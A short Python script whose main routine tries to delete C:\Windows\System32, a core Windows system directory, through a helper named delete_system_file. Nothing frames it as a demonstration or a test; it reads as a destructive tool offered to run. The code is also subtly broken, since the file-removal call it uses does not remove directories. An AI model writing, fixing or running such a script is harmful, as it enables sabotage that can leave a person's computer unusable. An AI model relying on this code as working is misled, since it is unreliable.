import os

def delete_system_file(file_path):
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"File '{file_path}' has been deleted.")
        else:
            print(f"File '{file_path}' does not exist.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    target_file = r"C:\Windows\System32"  # Set the target file path
    delete_system_file(target_file)
    input("Press Enter to exit...")
